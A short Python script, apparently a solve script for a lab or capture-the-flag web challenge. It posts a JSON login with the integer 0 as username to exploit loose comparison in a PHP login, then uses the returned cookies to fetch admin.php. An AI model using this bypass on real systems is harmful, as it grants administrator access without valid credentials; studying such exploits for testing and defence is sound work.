import os
import requests
import json

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", 8005)

r = requests.post(f"http://{HOST}:{PORT}/",
                  data=json.dumps({
                      "username": 0,
                      "password": "whatever"
                }),
                  headers={"Content-Type": "application/json"})

r = requests.get(f"http://{HOST}:{PORT}/admin.php", cookies=r.cookies)
print(r.text)
